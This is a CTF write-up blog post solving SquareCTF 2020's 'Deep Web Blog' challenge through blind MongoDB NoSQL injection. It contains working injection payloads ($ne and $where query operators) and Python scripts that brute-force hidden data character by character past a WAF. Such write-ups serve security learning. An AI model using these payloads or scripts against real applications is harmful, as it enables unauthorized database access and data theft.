---
title: "Squarectf 2020: Deep Web Blog"
date: 2020-11-14T14:06:35+05:30
lastmod: 2020-11-14T14:06:35+05:30
author: Mohammed Ajmal Siddiqui
authorlink: /
cover: https://cdn.pixabay.com/photo/2018/05/14/15/53/cyber-security-3400555_960_720.jpg
categories:
  - ctf writeups
tags:
  - security
  - web security
  - nosql injection
  - squarectf 2020
showcase: false
draft: false
---

This is the writeup for the "Deep Web Blog" web challenge from [SquareCTF 2020][1], which was worth 200 points and involved a Blind NoSQL Injection attack.

Challenge statement: A secret informant has tipped us off that hackers on the deep web have been plotting an attack on Square to steal our treasured Bitcoins...

Time to find what their plans are.
http://challenges.2020.squarectf.com:9541

<!--more-->

## TLDR; Hack Steps

This is a Bling NoSQL Injection attack.

1. Recognize the NoSQL Injection vulnerability using this payload: `GET /api/posts?title[%24ne]=`.
2. Develop an exploit that attempts to scan for the string "flag" in the post contents using the MongoDB `$where` operator: `/api/posts?%24where=function(){return%20this.content.includes('flag')}`.
3. The response returned for the above injection payload tells us that the flag contents have been redacted by the server. Develop a script that lets us enumerate the characters in the flag based on this response (see section titled **Enumerating the Flag Alphabet**).
4. Adapt the script from step 3 to leak the flag using the alphabet that we enumerated and the response of the server (see the section titled **Disclosing the Flag**).
5. `Pr0f1t!`

## Doing the Recon
The URL given takes us to a blog-like web interface with very limited functionality - all we see are a few posts and a search option, which seems to filter based on the search terms being in the title. Given that there is literally nothing else here, it was obvious that the search function was to be exploited somehow.

I started with a few benign strings like "test" and "hello" to get a feel for how it works, and then tried a few SQL injection tests to see if something turns up. Nothing did. I did look at the response headers using Chrome DevTools and noticed the `X-Powered-By: Express` response header, which is typically sent by a server that uses the ExpressJS framework, which is a popular routing and middlware framework for NodeJS. This made me consider the possibility that MongoDB was being used as the database, and I kept the possibility of noSQL injection in the back of my head. At this point, it was time to get serious and bring out the H4X0R tools - Burp.

With Burp fired up, and after making sure the browser is configured to use Burp as a proxy and that the proxy is turned on and *not* in intercepting mode (so that we can go over the website manually and have Burp record everything), I visited the URL again, made a couple of searches (one which yields a result - "test", and another which turns up empty - "hello"). From the HTTP History section of the proxy, I found the requests associated with the website and sent them to Burp repeater so that I can play with them.

With this setup, we can start poking around.

Right off the bat, we look at the search request we made and see that there is an API that seems to take care of the search at `/api/posts`, which takes a query parameter `title` and searches based on that. Repeating this request gives us a `304 Not Modified` response, which means the cached query from a previous search is still valid. However, we want to see the actual responses of our queries, and we can indicate that we don't have a cached response/our cached response is invalid by modifying or removing the `If-None-Match` header (see note below if you want to know why).

> Note: Without going into too much detail, the caching mechanism here relies on the `Etag` header included in the response of an HTTP request. This header is like a "tag" for the resource returned in the HTTP response. The browser/HTTP client can use this Etag with request headers like `If-None-Match` or `If-Modified-Since` headers, and if the servers deems that the cache entry is still valid, it will indicate this to the client with the 304 response, which implicitly asks the client to use the cached entry.

Here's a sample of the API response for the search query "test":

```json
[
  {
    "_id": "5faf26f272de010007670897",
    "title": "test",
    "content": "It works!"
  }
]
```

For starters, I tried to see if I could search based on fields other that the title (say using the `content` field) using a request like this:

```
GET /api/posts?content=test
```

But this didn't lead to anything interesting.

The API response, which is JSON, has an `_id` field for each post that was returned. This confirmed my suspicions that MongoDB was being used as the DB here, since the `_id` field is characteristic of MongoDB (I honestly don't know if other NoSQL DBs use the same field). At this point, I decided to explore the possibility of NoSQL injection - the little known cousin of SQLi that is used against noSQL databases. Yep, noSQL doesn't automatically mean no injection. :)

## Finding the NoSQLi Vulnerability

I started with trying characters like `' " \` which might help me break out of the context of the search query, but I wasn't very successful. Since I knew nothing about NoSQLi beyond the fact that it exists, I did some research. You can find a few useful links in the NoSQLi links section towards the end of the write-up. The most useful was [this primer to NoSQLi by OWASP][2], from which I found a payload that was used to effect a login bypass in the examples, but in our case will show us all the posts in the DB (which is what the API returns by default).

```
GET /api/posts?title[%24ne]=
```

Which basically translates to the MongoDB query (we're assuming the DB is called `posts`, though we don't really care about this):

```
db.posts.find({"title": {"$ne":""}})
```

This basically says, "give me everything in the DB where `title` does not equal `""`", i.e. the empty string. Since everything has a title, this returns all the documents in the collection!

NoSQLi vulnerability confirmed!

## Understanding the Level of Control

I spent some time with the MongoDB docs trying to see what kind of query operators existed and whether any of them could be used for things like revealing hidden documents, enumerating collections, remote code execution (yes, I know, I'm an optimistic hacker!), etc. I also explored a few things such as giving invalid query parameters (such as `abcd`). I didn't have much luck with any of this, but then something clicked:

```
/api/posts?%24ne=
```

And that threw a `500 Internal Server Error` with this error message:

```
unknown top level operator: $ne
```

This is interesting! A quick google search tells us that the `$ne` operator can only be used with a field (and not at the top level, as the error message indicates). So for example this is valid:

```
db.posts.find({"title": {"$ne":""}})
```

But this isn't:
```
db.posts.find({"$ne":""})
```

This tells us that we can control top level operators! Sweet, we now have a lot more options.

I went over the MongoDB docs and searched for interesting operators that I could use, but the process of trying an operator by making a query to the vulnerable website was getting cumbersome. So I decided to set up a better environment to develop the exploit.

## Setting Up an Exploit Development Environment

Okay, I'll say this right off the bat - I didn't do anything that was even remotely as fancy as "setting up an exploit development environment" might sound. But I'm turning this into a separate section to highlight that it is **extremely important** for a hacker to be able to replicate the target environment as much as possible, and use it to get familiar with the stuff to be exploited, test exploits, explore the environment, etc.

Trust me, I've failed CTF challenges in the past because I didn't make the effort of setting things up locally.

Anyways, here we don't have to do much. I just spun up a mongodb server locally (it isn't hard to install mongo, though in my case I had it installed already since I work with the MERN stack sometimes) and created a new database:

```
use db nosqli
db.posts.insertMany(<copy-paste the array of posts returned by the API>)
```

We can then replicate the search functionality using something like

```
# title=test

db.posts.find({"title": "test"})
# Returns the post titled "test"
```

And our exploit PoC from earlier would translate to
```
# title[%24ne]=

db.posts.find({"title": {"$ne": ""}})
# Returns all the posts
```

At this point, we can easily play with various operators and queries, and when we like something, we can inject the query into the vulnerable application via Burp and see how it responds.

Let's continue!

## Exploiting the NoSQLi

As I was going over the MongoDB docs, I came across an interesting top level operator: [the $where operator][3]. Basically, this allows you to _run a JavaScript function over each document in the collection in order to filter the items you need_. This immediately spelled "JavaScript RCE" to be in big, bold letters, so I dove in. However, I quickly realised that I wasn't getting a reverse shell on the server anytime soon. Heck, I wasn't even going to get a `console.log`! Not only is the JS allowed in a `$where` function restricted, but the return value of the function is treated as a boolean. If it is truthy, the document will be included in the results, and if it is falsey, it will be skipped.

In other words, no matter what I do,

1. I can't execute arbitrary code on the server
2. I can't see any output. I can just filter the documents in the collection based on a custom function.

For example, the following mongoDB query (and the corresponding injected query in Burp) would return everything:

```
# MongoDB Query
db.posts.find({$where: function(){return true}})

# URL with query injected
/api/posts?%24where=function(){return%20true}
```

That's quite limiting.

I spent quite a long time stuck at this point, and I was quite frustrated, before an idea hit me. What if I use the `$where` query and the function I control to explore the collection further and see if I can find something interesting?

For example, I know that all the flags in SquareCTF 2020 are of the format `flag{s0m3_t3xt_h3r3}`, so if the flag is in one of posts (which is hidden somehow), it must contain the string "flag", right?

First, I created a MongoDB query that uses `$where` and a JS function that can find posts which contain the word "test" in them in my local Mongo shell. This was trivial:

```
db.posts.find({"$where": "function(){return this.content.includes('test')}"})
# Returns a single post, which has the word "test" in it somewhere
```

>Note that `this` within a `$where` function is bound to the document being filtered, and the `includes` method in JavaScript checks for substrings

We can then convert this into a URL query with an injection as follows:

```
/api/posts?%24where=function(){return%20this.content.includes('test')}
# Returns the same single post that the mongo query returne earlier
```

> While experimenting with this, I was able to get an error implying a missing `"` in a script, which might hint that a breakout from the context of the query is possible, but I didn't explore this possibility further. I may be completely wrong about this. Still, it is interesting for a hacker to note such errors.

Nice! Now we can try something more ambitious, such as looking for the string "flag" in the content. Here's the query:

```
/api/posts?%24where=function(){return%20this.content.includes('flag')}
```

This leads us to a interesting response:

```json
[
  {
    "_id": "5faf26f272de010007670898",
    "title": "flag",
    "content": "Looking for a flag? You won't find it here. Maybe this can help: https://www.youtube.com/watch?v=Jbix9y8iV38",
    "flag": "[REDACTED] Flag format detected - redacted by WAF"
  }
]
```

SO CLOSE!

It looks like we've come a long way, but we're not quite there yet. There are a few interesting things in this response that lets us investigate further (the video link in the content is interesting, and I watched a few minutes of it as well, but I quickly realised it _won't_ help with finding the flags that we need. Still, nice one, organizers!):

1. There is a _new_ field here called `flag`
2. It says that the `flag` field was "redacted by WAF"

A WAF refers to a Web Application Firewall. In other words, something is looking at the responses sent by the server and filtering out the flag! Outrageous!

Looks like we will have to chain a WAF bypass with the NoSQLi that we just exploited in order to get the flag.

Or do we?

## Disclosing the Flag Without Bypassing the WAF

Though I did try and see if I could fathom out the behaviour of the WAF (mostly looking at whether mongo will let me control formatting of the documents returned withing the query itself, as opposed to a standard MongoDB projection, which I didn't have control over), I really wasn't in a mood for this.

So I came up with another idea.

We need to figure out what the flag is, and we have a method that tells us if _a substring is a part of the content of a post_. We also know that the search results are a JSON array, which can be empty if there are no results.

And that is a vulnerability.

Sure, the WAF can prevent us from getting the flag in the response, but if we can make it tell us if a certain substring is a part of the flag, we can slowly figure out the flag ourselves!

In order to pull this off, we'll need a couple of things:

1. We only want to target the document that contains the flag
2. We want to test if the `flag` field contains a substring that we supply to it

This is relatively easy. Here's a `$where` query that does just that (note: you can add a dummy record to your local mongoDB with the API response from earlier and a fake value of `flag` to actually try this. I didn't need to, so I'll skip it here):

```
# We're testing to see if the substring `flag` exists in the flag
# I've prettified this here, but you don't need all the whitespace
db.posts.find({"$where": "function(){
  if(this.flag!=undefined){
    return this.flag.includes('flag')
  } else {
    return false
  }
}"})
# returns nothing if you haven't added the dummy document with the flag, returns said document otherwise
```

And this is the equivalent query:

```
/api/posts?%24where=function(){if%20(this.flag!=undefined){return%20this.flag.includes('flag')}else{return%20false}}
```

This returns the single record containing the response we saw earlier, with the flag redacted. However, if you check for a substring that _isn't_ a part of the flag, you get an empty array. For example, this query string returnsan empty array:

```
/api/posts?%24where=function(){if%20(this.flag!=undefined){return%20this.flag.includes('flag1234')}else{return%20false}}
```

With this knowledge, we can start disclosing the flag.

## Enumerating the Flag Alphabet

My idea was to write a bruteforce script that incrementally builds the flag based on the responses by the server. However, with a potential alphabet of nearly 65 characters, and an O(n^2) iteration algorithm (as you will see in the next section), with each iteration making and waiting for a network call, this would take quite a while. So let's start with figuring out the characters that the flag contains.

Here's a python script that does just that, with explanatory comments.

> Tip: The easiest way to get scripting is to right click on the request in Burp, select `Copy as curl command`, ssearch for a "curl to python requests converter" online, and use the converter to generate the code. That's what I did here, hence the bloated headers.

```python
import requests
import json

def req(param):
  # Headers as they were present in the request
  headers = {
    'Host': 'challenges.2020.squarectf.com:9542',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Origin': 'http://challenges.2020.squarectf.com:9541',
    'Connection': 'close',
    'Referer': 'http://challenges.2020.squarectf.com:9541/',
  }

  # Construct our NoSQLi query
  params = (
      ('$where', 'function(){if (this.flag!=undefined){return this.flag.includes(' + param + ')}else{return false}}'),
      )

  response = requests.get('http://challenges.2020.squarectf.com:9542/api/posts', headers=headers, params=params, verify=False)
  return json.loads(response.content)

# The alphabet we're trying
alpha="abcdefghijklmnopqrstuvwxyz0123456789{}_-ABCDEFGHIJKLMNOPQRSTUVWXYZ"

# This will contain the characters in the flag
flag_chars=""

for i in alpha:
  mystr = "'" + i + "'"
  print("trying: {}".format(mystr))
  try:
    resp = req(mystr)
    # The response is a JSON array
    # If the flag contains the substring, the response will have a length of 1
    # Otherwise, it will have a length of zero
    if len(resp) > 0:
      # The the length of the response is more than zero, the flag contains this character
      # So append it to the list of characters
      flag_chars += i
      print("Alphabet: {}".format(flag_chars))
  except:
    continue
```

This gives us the flag alphabet!

```
Alphabet: afglnsu0{}LQSV
```

## Disclosing the Flag

Now we can adapt the same script from above to bruteforce our flag. Heres the new variant (the `req` function is the same as earlier):

```python
# We know for sure that the flag starts with 'flag{'
initstr="flag{"
# The alphabet of the flag that we found earlier
alpha="afglnsu0{}LQSV"

i = 0
while i<len(alpha):
  # Construct our test substring for the flag
  mystr = "'" + initstr + alpha[i] + "'"
  print("trying: {}".format(mystr))
  try:
    resp = req(mystr)
    if len(resp) > 0:
      # If the length of the response is non-zero, this is a valid substring
      # So we append it to the initial string and consider it a part of the flag
      initstr += alpha[i]
      # Now that we have found one more character, we must iterate over the alphabet again
      i = 0
      print("Flag: {}".format(initstr))
    else:
      # Move on to the next character
      i += 1
  except:
    # Move on to the next character
    i += 1
```

This script will slowly figure out the flag character by character based on the application response (it will give you an extra character which you can ignore). In a sense, this could be called a Blind NoSQLi injection attack because though we don't directly get the response from the DB (i.e. the flag), we are able to infer it based on the application response to our injected queries.

The flag is `flag{n0SQLn0Vulns}`!

## Final Thoughts

This was quite a fun challenge to solve, especially because just finding the NoSQLi vulnerability wasn't the end of the story, and how the whole Blind NoSQLi vulnerability was structured. The challenge also drives home the important lesson that NoSQL DBs are not free from injection vulnerabilities!

## NoSQLi Resources

A _very_ small collection of useful resources for NoSQLi that I found while solving this challenge:

1. [A quick intro to NoSQLi from OWASP][2]
2. [Code Injection in MongoDB][4]
3. [NoSQLi Wordlist][5]


  [1]: https://squarectf.com/ "SquareCTF 2020"
  [2]: https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf "OWASP NoSQLi"
  [3]: https://docs.mongodb.com/manual/reference/operator/query/where/#op._S_where "MongoDB $where Operator"
  [4]: https://www.objectrocket.com/blog/mongodb/code-injection-in-mongodb/ "Code Injection in MongoDB"
  [5]: https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt "NoSQLi Wordlist"
